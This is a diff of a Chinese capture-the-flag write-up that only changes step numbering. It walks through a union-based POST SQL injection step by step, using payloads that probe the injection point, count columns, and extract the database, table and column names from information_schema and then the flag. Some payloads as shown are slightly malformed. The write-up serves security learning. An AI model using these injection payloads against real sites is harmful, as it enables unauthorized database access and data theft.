@@ -33,28 +33,28 @@ tags:                                    #标签
 
 ## 解题过程：
 
-1.首先查看网页源代码，发现是post方法，果断打开hackerbar。post注入是通过对输入框进行传参，可以被带入数据库进行的查询，
-post注入的两个条件：1.用户可以控制传参，2.用户输入的语句被带入数据库进行查询。
+**1.** 首先查看网页源代码，发现是post方法，果断打开hackerbar。post注入是通过对输入框进行传参，可以被带入数据库进行的查询，
+post注入的两个条件：(1)用户可以控制传参，(2)用户输入的语句被带入数据库进行查询。
 
-2.Post data 框 输入`search='`，发现页面出错，可知存在注入的可能。继续输入`search=' and 1=1`，发现依然报错，`search=' and 1=1#` 发现变回正常页面。证明存在注入点，可用'  #进行闭合。
+**2.** Post data 框 输入`search='`，发现页面出错，可知存在注入的可能。继续输入`search=' and 1=1`，发现依然报错，`search=' and 1=1#` 发现变回正常页面。证明存在注入点，可用'  #进行闭合。
 
 如何理解所构造的payload？
 
 
 OK,简单的解释一下SQL语句.我们搜索的内容是 `' and 1=1 # `,代入到数据库的语句是:` select * from XXX where search = ' ' and 1=1 #'`，搜索框开头输入的单引号闭合了原来前面的单引号，最后是一个#,注释了后面的单引号,数据库在执行语句的时候其实执行的是:`select * from XXX where content = ' ' and 1=1`,这个语句理解就很简单了。
 
-3.用`order by` 查询当前页面连接的列名个数：`search=' order by 1# `页面返回正常 ，直到4，页面开始出错，说明有3个。
+**3.** 用`order by` 查询当前页面连接的列名个数：`search=' order by 1# `页面返回正常 ，直到4，页面开始出错，说明有3个。
 
-4.使用`union` 联合查询 显错点，输出点，语句：`search='  union select 1,2,3# `，页面爆出显位2，3。
+**4.** 使用`union` 联合查询 显错点，输出点，语句：`search='  union select 1,2,3# `，页面爆出显位2，3。
 
-5.OK,接下来的步骤就很容易了，利用hackerbar插件，构造`search= ' Union Select 1,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),3# `,得到数据库名为news。
+**5.** OK,接下来的步骤就很容易了，利用hackerbar插件，构造`search= ' Union Select 1,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),3# `,得到数据库名为news。
 
-6.接着获取表名，构造`search= ' Union Select 1,group concat(table name),3 from information schema.tables where table schema= 0x6E657773 # `，得到表名为**f1agfl4gher3。**
+**6.** 接着获取表名，构造`search= ' Union Select 1,group concat(table name),3 from information schema.tables where table schema= 0x6E657773 # `，得到表名为**f1agfl4gher3。**
  注意：这里需要把数据库名称`news`做了一个16进制Hex编码，编码之后为`0x6E657773 `。
 
-7.同理获取列名：`search= ' Union Select 1,group concat(column name),3 from information schema.columns where table name=0x66316167666C346768657233)# ` ，得到列名为**h3r31sfl4g。**
+**7.** 同理获取列名：`search= ' Union Select 1,group concat(column name),3 from information schema.columns where table name=0x66316167666C346768657233)# ` ，得到列名为**h3r31sfl4g。**
 
-8.最后获取数据，`search= ' Union Select 1,h3r31sfl4g,3 from f1agfl4gher3 # `，得到flag！
+**8.** 最后获取数据，`search= ' Union Select 1,h3r31sfl4g,3 from f1agfl4gher3 # `，得到flag！
 
 **flag{sql_ information_ schema_ hack}**
 
